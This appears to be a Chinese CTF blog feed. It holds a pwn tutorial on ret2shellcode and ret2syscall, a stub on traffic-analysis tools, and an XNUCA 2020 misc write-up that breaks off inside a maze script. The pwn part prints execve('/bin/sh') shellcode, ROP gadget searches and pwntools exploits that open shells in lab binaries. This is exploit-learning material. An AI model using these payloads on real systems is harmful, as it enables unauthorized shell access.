<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>一般来说可执行程序执行时都是让<code>cpu</code>直接读取运行<code>机器码</code>的，而机器码说到底不过是一串对<code>cpu</code><strong>具有特殊意义</strong>的二进制数值，而计算机系统内部的所有工作都是基于二进制的，包括我们的输入也是以二进制的形式储存在一个地方。如果一个程序存在溢出，但是它本身没有什么可以让我们直接利用的代码段，这时候我们可以看看有没有机会让<code>cpu</code>去<strong>执行我们所能控制的二进制数值</strong>，也就是将我们的输入作为机器码直接执行。<br>说直白一点就是我们刻意控制我们输入的其实是一串可以实现特殊作用的机器码，然后想办法控制<code>cpu</code>的<code>rip/eip</code>为我们的输入的地址，从而令其执行我们想要执行的命令。这串用以<strong>实现某个目的</strong>的<code>code</code>就是所谓的<code>shellcode</code>。</p>
<p>下面举个例子，源码如下：（<em>假设我们已经可以控制eip为我们的输入所在地址，直接验证shellcode能否实现我们的目的</em>）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[<span class="number">24</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%24c&quot;</span>,shellcode);</span><br><span class="line">    (<span class="keyword">void</span>)((<span class="keyword">void</span> (*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序下载：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2shellcode/shellcode">shellcode</a><br>程序已经声明了一个字符串变量，然后我们输入的内容会被作为指令执行。这里我们将事先准备的可以呼出终端的<code>shellcode</code>作为输入观察结果，这里依旧通过<code>pwntools</code>来完成。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>可以看到，我们成功用这个本来什么功能都没有的程序呼出了一个终端。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200423183617.png" alt="20200423183617"></p>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>前面我们知道了可以通过<code>溢出</code>和<code>ret</code>来控制程序的执行内容以及<code>shellcode</code>的大概工作原理。那么当我们不能直接控制程序执行<code>shellcode</code>时，我们可以试着<strong>通过</strong><code>ret</code><strong>程序本身的个别代码段，变相实现</strong><code>shellcode</code>的作用。</p>
<p>这里主要要说到<strong>两个汇编语句</strong>：32bit程序是<code>int 80h</code> 、64bit程序是<code>syscall</code>。这两个语句分别是<code>32bit</code>和<code>64bit</code>实现系统调用的关键语句。<br>不了解系统调用的先来简单了解一下：</p>
<ul>
<li><a href="https://blog.csdn.net/u011308691/article/details/16119207?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-2">csdn-简单了解系统调用</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">维基百科的详细介绍</a></li>
</ul>
<p>利用<code>ret2text</code>来调用程序本身的汇编语句实现<code>shellcode</code>。这个就是<code>ret2syscall</code>。<br>在做ctf时一般是通过<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>来呼出终端实现目的。</p>
<p>这里因为直接编译c程序不好控制它的汇编代码所以直接用ctf-wiki里给的程序了，偷个懒233<br> <strong>bamboofox</strong> 中的 <strong>ret2syscall</strong> ：<a href="http://xibai.xyz/downloads/ctf-wiki/Linux%20Pwn/Stack%20Overflow/Basic%20ROP/ret2syscall/rop">ret2syscall</a></p>
<p>用<code>pwntools</code>自带的<code>checksec</code>命令可以看到我们关注的信息：</p>
<blockquote>
<p>Arch:     i386-32-little<br>  RELRO:    Partial RELRO<br>  Stack:    No canary found<br>  NX:       NX enabled<br>  PIE:      No PIE (0x8048000)</p>
</blockquote>
<p>ida查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依旧是一个简单的栈溢出，没有预留什么功能函数。需要<code>ret2syscall</code>的方法来<code>getshell</code>。这里32bit系统的<code>execve()</code>函数的调用号一般都是 <strong>11</strong> 也就是 <strong>0xb</strong> 。<br>所以我们要构造一串命令，将 <strong>eax赋值为0xb，清零ecx，edx，将“/bin/sh”的地址放入ebx，最后执行int 80h</strong>。<br>这里我一般是用<code>ROPgadget</code>来寻找程序里可以实现相关目的的代码段。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
<p>程序里可以用的代码片段不止一个是一般选最方便的，这里选第二个。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
<p>这里选<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p>
<p>顺便看看程序里有没有能用的<code>/bin/sh</code>字符串。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
<p>最后找一个<code>int 80h</code>就可以了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;int&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br></pre></td></tr></table></figure>
<p>至此，相关片段都已经找好了，我们只需要构造一下payload，是其能完美调用这些片段并实现我们的目的就好。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">eax_addr = p32(<span class="number">0x80bb196</span>)</span><br><span class="line">binsh_addr = p32(<span class="number">0x80be408</span>)</span><br><span class="line">edx_ecx_ebx_addr = p32(<span class="number">0x806eb90</span>)</span><br><span class="line">int_addr = p32(<span class="number">0x8049421</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload += eax_addr</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += edx_ecx_ebx_addr</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += binsh_addr</span><br><span class="line">payload += int_addr</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="上篇-汐白学Pwn-2-SomeBasic"><a href="#上篇-汐白学Pwn-2-SomeBasic" class="headerlink" title="上篇-汐白学Pwn-2(SomeBasic)/)"></a><a href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic">上篇-汐白学Pwn-2(SomeBasic)</a>/)</h2><h2 id="下篇-汐白学Pwn-3-2-ROP-Intermediate"><a href="#下篇-汐白学Pwn-3-2-ROP-Intermediate" class="headerlink" title="下篇-汐白学Pwn-3.2(ROP-Intermediate)/)"></a><a href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP">下篇-汐白学Pwn-3.2(ROP-Intermediate)</a>/)</h2>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析（萌新开坑Ing-慢慢填）</title>
    <url>/2020/03/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong><em>最后更新于：2020-03-05 21：44</em></strong></p>
<h2 id="萌新已知的工具"><a href="#萌新已知的工具" class="headerlink" title="萌新已知的工具"></a>萌新已知的工具</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>这玩意个人觉得想把它玩好还是直接买本书叭emmm</p>
<h3 id="usbpacp"><a href="#usbpacp" class="headerlink" title="usbpacp"></a>usbpacp</h3><p>用来抓取usb流量包的工具。一般安装 wireshark 时会一起装，直接用 wireshark 抓取就可以。</p>
<h3 id="npcap"><a href="#npcap" class="headerlink" title="npcap"></a>npcap</h3><p>Npcap 是 Nmap 项目的网络包抓取库在 Windows 下的版本。</p>
<h3 id="RouterPassView-能查看宽带数据"><a href="#RouterPassView-能查看宽带数据" class="headerlink" title="RouterPassView(能查看宽带数据)"></a>RouterPassView(能查看宽带数据)</h3><p>能够解析宽带数据包。</p>
<h2 id="目前见过的类型"><a href="#目前见过的类型" class="headerlink" title="目前见过的类型"></a>目前见过的类型</h2><h3 id="常规网络流量包分析"><a href="#常规网络流量包分析" class="headerlink" title="常规网络流量包分析"></a>常规网络流量包分析</h3><p>常见的常规流量包一般主要是分析一下三种流量。</p>
<h4 id="ftp流量"><a href="#ftp流量" class="headerlink" title="ftp流量"></a>ftp流量</h4><p>ftp服务的流量分析目前见过的都比较简单。一般都是查看用户名和密码，获取ftp传输的文件。暂时没有发现比较难的ftp流量分析。</p>
<h4 id="http流量"><a href="#http流量" class="headerlink" title="http流量"></a>http流量</h4><p>这个应该是最常见的流量，通过截取上网时的流量分析目标行为。一般是通过分析相关http流量来找到关键网站、文件、用户登录某网站的账号/密码。目前来说主要难点和ftp一样，当流量数据特别多时会难以找到关键数据。</p>
<h4 id="https流量"><a href="#https流量" class="headerlink" title="https流量"></a>https流量</h4><p>https主要就是将明文数据加密以防止数据被他人截获。这里所用的加密主要是基于RSA的公钥加密。其加密数据协议在<code>wireshark</code>中是<code>TLS/SSL</code>。对于这种加密数据，只能想办法获取私钥或者公钥来进行解密，然后作为http流量分析。</p>
<h3 id="USB流量包分析"><a href="#USB流量包分析" class="headerlink" title="USB流量包分析"></a>USB流量包分析</h3><p>对于USB流量，常规的usb流量分析一般就是键盘和鼠标的流量分析。</p>
<p>这里直接去看大佬写好的文章就好了。</p>
<p>这个文件里面第53页有usb键盘流量中和键盘按键对应的十六进制数据表：<a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf</a></p>
<h3 id="网络通信流量包（voip-rtp）"><a href="#网络通信流量包（voip-rtp）" class="headerlink" title="网络通信流量包（voip rtp）"></a>网络通信流量包（voip rtp）</h3><h3 id="Bluetooth"><a href="#Bluetooth" class="headerlink" title="Bluetooth"></a>Bluetooth</h3>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-XNUCA Writeup(MISC)</title>
    <url>/2020/11/01/2020XNUCA/</url>
    <content><![CDATA[<p>pg: 题目还行，感觉做的时候挺有意思的，就是自己做题时太憨憨导致全部错失一血呜呜呜~~~</p>
<h2 id="torch-model"><a href="#torch-model" class="headerlink" title="torch model"></a>torch model</h2><p>题目要求环境: python==3.7.7 、torch == 1.5.0</p>
<p>给了一个神经网络学习的模型训练python脚本(<code>ipynb</code>格式)，直接vscode打开可以自动装相关环境一键查看，vscode还是香的。</p>
<p>查看ipynb可以知道该模型的作用是识别题目给出的图片为<code>flag</code>，<code>flag</code>长度和<code>sha256</code>已知。模型数据被保存为<code>model_state_dict.pt</code>，并且中间有一段数据用随机数据进行了覆盖修改，查看题目给出的<code>diff.png</code>以及<code>torch.save</code>的源码可知：修改了<code>torch</code>中<strong>保存模型数据信息的数据段</strong>，而且将<strong>模型数据字典中的键值名乱序保存进文件</strong>。pt文件中的数据用<code>pickle</code>打包。</p>
<p>至此题目信息查看完毕，题目解法为修复pt文件数据，用torch读取模型识别flag。<br>这里我们用两个同长度的字符串代替原flag，重新训练两个模型，并将其保存为两个正常的pt文件。然后<strong>对比两个pt文件保存模型数据信息数据段的十六进制</strong>，发现除了<code>serialized_storage_keys</code>的<code>key</code>的信息，其余结构基本一致。所以修复只需要将其中的<code>key</code>的键值名替换为题目文件中的<code>key</code>的键值名。对比图如下：</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102012727.png" alt="20201102012727"></p>
<p>提取题目模型文件和我们刚保存的模型文件中的<code>serialized_storage_keys</code>数据，并解包替换重新打包写回文件，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./model_state_dict.pt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> model1:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./model_state_dict_test.pt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> model2:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./model_state_dict_flag.pt&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> model3:</span><br><span class="line">            model3.write(model1.read(<span class="number">0x89</span>))</span><br><span class="line">            model2.read(<span class="number">0x89</span>)</span><br><span class="line">            tmp_flag_obj = model1.read(<span class="number">0x4ef</span>-<span class="number">0x89</span>)</span><br><span class="line">            tmp_test_obj = model2.read(<span class="number">0x4e5</span>-<span class="number">0x89</span>)</span><br><span class="line">            tmp_flag_keys = model1.read(<span class="number">0x5c9</span>-<span class="number">0x4ef</span>)</span><br><span class="line">            tmp_test_keys = model2.read(<span class="number">0x5b5</span>-<span class="number">0x4e5</span>)</span><br><span class="line">            tmp1 = pickle.loads(tmp_flag_keys,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            tmp2 = pickle.loads(tmp_test_keys,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(tmp1)</span><br><span class="line">            <span class="built_in">print</span>(tmp2)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp1)):</span><br><span class="line">                tmp_test_obj = tmp_test_obj.replace(<span class="built_in">bytes</span>(tmp2[i],encoding=<span class="string">&#x27;utf-8&#x27;</span>),<span class="built_in">bytes</span>(tmp1[i],encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            model3.write(tmp_test_obj)</span><br><span class="line">            model3.write(tmp_flag_keys)</span><br><span class="line"></span><br><span class="line">            tmp = model1.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> tmp != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">                model3.write(tmp)</span><br><span class="line">                tmp = model1.read(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>接下来是踩坑时刻。用此脚本复现该题目的话会发现修复之后的pt文件依旧不能被加载。</p>
<p>注意看脚本可以发现，pt文件数据虽然全是用pickle打包的，但是对于模型的<code>obj</code>数据却没有选择解包替换，而是直接对被打包的数据进行了“带包”替换。这里如果有仔细分析<code>torch.save</code>的源码的话，就会知道，官方对于obj的数据自定义了一套pickler检查规则，这里是因为结构信息几乎完全一致，所以就没有去读官方定义的那套规则。不过这样的话就需要注意修改<code>obj</code>集合数据中打包的小结构体的一个关键数据：</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102014247.png" alt="20201102014247"></p>
<p>图中选中部分是为一个被打包的小结构体，每一个小结构体都是<code>obj</code>集合中的一个对象。结构体的<code>magic header</code>是单个字节的十六进制<code>\x71</code>,其后紧跟着的一个字节是这个结构体在<code>obj</code>集合中的顺序序号，上图选中的即为<code>\x2e</code>第46个结构体。这里注意下下图红色标记字节，从该字节开始的四个字节为<code>pickle</code>打包数据中一个集合内相关对象的名字的长度，小端序。这里是<code>\x0D\x00\x00\x00</code>，即长度为13，但是13其实是我生成新模型数据文件时新模型内的<code>key</code>的名字长度，如果去观察偏移<code>\x4ef</code>后的题目模型文件的<code>key</code>数据，会发现这些<code>9452xxxx</code>的键值名称长度其实都为14，这里因为数量较少，所以我手动修复了。此时pt文件中的模型关键信息已经修复完毕，torch已经可以解析加载pt文件。<br>(pg:这个长度不一样就离谱，第一天下午看题的时候一个下午都没发现自己把14数成13，结果别的师傅都把题刷烂了自己还纳闷题目文件为啥比自己生成的文件大了20字节，一直以为环境没配好反复配了几个小时环境，惨惨emmm)</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102014936.png" alt="20201102014936"></p>
<p>但是，还记得<strong>题目图片中的random</strong>嘛，这个东西还没用呢，还有坑。此时直接加载模型会发现如下报错：</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20201102015948.png" alt="20201102015948"></p>
<p>这里就是乱序储存导致<code>torch</code>在<code>load</code>模型训练数据时，<code>serialized_storage_keys</code>中的每个键值对应的那一部分模型数据长度与现在实际<code>load</code>解析得到的长度不一致导致的，这里它直接给出了应该是什么长度的键值。</p>
<blockquote>
<p>RuntimeError: storage has wrong size: expected 120 got 10</p>
</blockquote>
<p>120即为第一部分的长度，但此时第一个键值对应长度为十，这里可以直接去<code>torch.load</code>的源码那里，用一个<code>print</code>输出它解析到的<code>obj</code>信息，从而得到每个数字键值名对应的对象的数据长度，然后将pt文件中<code>\x4ef</code>偏移后的<code>keys</code>集合数据重新排序复写，这里给出脚本，因为就十条，所以没搞自动化嘤嘤嘤QAQ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./model_state_dict_flag.pt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./tmp.pt&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> o:</span><br><span class="line">        o.write(f.read(<span class="number">0x4ef</span>))</span><br><span class="line">        tmp = f.read(<span class="number">0x5c9</span>-<span class="number">0x4ef</span>)</span><br><span class="line">        tmp = pickle.loads(tmp,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        tmp = <span class="built_in">sorted</span>(tmp)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521743421392&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">0</span>,<span class="string">&#x27;94521743421392&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521743421488&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">1</span>,<span class="string">&#x27;94521743421488&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521743257408&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">2</span>,<span class="string">&#x27;94521743257408&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521743706048&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">3</span>,<span class="string">&#x27;94521743706048&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521742563680&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">4</span>,<span class="string">&#x27;94521742563680&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521716638368&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">5</span>,<span class="string">&#x27;94521716638368&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521743430240&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">6</span>,<span class="string">&#x27;94521743430240&#x27;</span>)</span><br><span class="line">        tmp.remove(<span class="string">&#x27;94521743916656&#x27;</span>)</span><br><span class="line">        tmp.insert(<span class="number">7</span>,<span class="string">&#x27;94521743916656&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        tmp = pickle.dumps(tmp)</span><br><span class="line">        o.write(tmp)</span><br><span class="line">        tmp = f.read(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> tmp != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            o.write(tmp)</span><br><span class="line">            tmp = f.read(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>至此，pt文件彻底修复，直接load然后加载图片即可获取flag</p>
<h2 id="catchthecat"><a href="#catchthecat" class="headerlink" title="catchthecat"></a>catchthecat</h2><p>考察数据结构算法。（ps：千万别乱找网上的轮子！自己造的真香！）<br>两个脚本解决，第一个遍历迷宫获取迷宫地图，第二个求迷宫两点最短路径（此处顺便还要看点运气emmm）</p>
<p>首先题目源码给出，根据源码可知地图除了墙还有炸弹，遇见炸弹直接game over。所以写探索迷宫的算法时要考虑到重连问题。这里我用pwntools + 深度优先算法遍历迷宫数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">NOTHING = <span class="number">0</span></span><br><span class="line">WALL = <span class="number">1</span></span><br><span class="line">BOMB = <span class="number">2</span></span><br><span class="line">CAT = <span class="number">3</span></span><br><span class="line">PERSON = <span class="number">4</span></span><br><span class="line">directions = [<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>]</span><br><span class="line">dic = &#123;<span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>:<span class="string">&#x27;r&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在迷宫中判断下一个节点是否可以去或者探索未知节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">turn</span>(<span class="params">game,<span class="built_in">map</span>,direction,x,y</span>):</span></span><br><span class="line"></span><br><span class="line">    status = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&quot;u&quot;</span>:</span><br><span class="line">        tmp_x = x - <span class="number">1</span></span><br><span class="line">        tmp_y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> x == <span class="built_in">len</span>(<span class="built_in">map</span>) - <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">map</span>.append([<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">map</span>[<span class="number">0</span>]))])</span><br><span class="line">        tmp_x = x + <span class="number">1</span></span><br><span class="line">        tmp_y = y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">        tmp_y = y - <span class="number">1</span></span><br><span class="line">        tmp_x = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y == <span class="built_in">len</span>(<span class="built_in">map</span>[<span class="number">0</span>]) -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                i.append(<span class="number">0</span>)</span><br><span class="line">        tmp_x = x</span><br><span class="line">        tmp_y = y + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">map</span>[tmp_x][tmp_y] == NOTHING:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            game.sendline(direction)</span><br><span class="line">            sleep(<span class="number">0.1</span>)</span><br><span class="line">            infor = game.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;recvError!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;WALL&quot;</span> <span class="keyword">in</span> infor:</span><br><span class="line">            <span class="built_in">map</span>[tmp_x][tmp_y] = WALL</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;BOMB&quot;</span> <span class="keyword">in</span> infor:</span><br><span class="line">            <span class="built_in">map</span>[tmp_x][tmp_y] = BOMB</span><br><span class="line">            x = tmp_x</span><br><span class="line">            y = tmp_y</span><br><span class="line">            status = <span 